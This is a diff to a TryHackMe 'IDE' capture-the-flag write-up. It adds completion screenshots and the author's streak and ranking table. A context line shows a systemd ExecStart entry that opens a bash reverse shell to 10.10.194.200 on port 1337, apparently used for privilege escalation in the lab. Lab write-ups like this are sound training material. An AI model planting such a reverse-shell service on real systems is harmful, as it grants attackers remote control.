@@ -10,7 +10,7 @@ It´s part of my $$\textcolor{#FF69B4}{\textbf{320}}$$-day-streak in  <a href="h
 
 <p align="center">An easy box to polish your enumeration skills!. It is classified as an easy-level CTF, and you can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed. <a href="https://tryhackme.com/room/ide">IDE</a>.</p>
 
-<p align="center"> <img width="900px" src=""> </p>
+<p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/aef3fb0a-0a97-4adc-b32b-e6d868c2fde5"> </p>
 
 <br>
 <br>
@@ -294,11 +294,6 @@ drac@ide:/srv/ftp$
 ![image](https://github.com/user-attachments/assets/2fa73f06-da34-4e11-a8ec-b80873d7ca90)
 
 
-
-<br>
-
-![image](https://github.com/user-attachments/assets/64a1d55d-e6e1-4f8a-a716-774d7b57f547)
-
 <br>
 
 ```bash
@@ -310,12 +305,55 @@ ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.194.200/1337 0>&1'
 
 <br>
 
+![image](https://github.com/user-attachments/assets/b41c3a0a-2030-439c-b5f5-1ce1d58a55d4)
+
+<br>
+
+<p align="center">Discovered <code>root.txt</code>.</p>
+
+![image](https://github.com/user-attachments/assets/b5410957-4bf8-48e9-8cb5-2be41d44f353)
+
+<br>
+
+
+<h1 align="center">
+  $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$
+</h1>
 
 
 
 
+<p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/ff3a3c39-8169-48a4-8086-37c27b9dc5ae"> </p>
+
+<br>
+
+<p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/2c265a14-a0b3-4019-bd3a-2fe82f6d3f15e"> </p>
 
 
+<br>
+<br>
+
+<h1 align="center">
+  $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$
+</h1>
+
+
+<div align="center">
+
+| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
+| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
+|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |           |
+| March 22, 2025    | 320      |     349ᵗʰ    |        8ᵗʰ   |    772nd    |     8ᵗʰ    |  87,488  |       623 |   59      |
+
+</div>
+
+<p align="center"> Global All Time: 352ⁿᵈ<br><br><img width="900px" src="https://github.com/user-attachments/assets/1959739b-511b-4f19-9b39-750d613c94f3"> </p>
+
+<p align="center"> Brazil All Time: 8ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/123eca1f-8ef2-49e4-967f-0235547af297"> </p>
+
+<p align="center"> Global monthly: 772nd<br><br><img width="900px" src="https://github.com/user-attachments/assets/268ed383-6988-45f3-80f3-6692f22ad562"> </p>
+
+<p align="center"> Brazil monthly: 8ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/2e385bd1-466c-4cbe-bf3e-ad7de4a5783f"> </p>
 
 
 
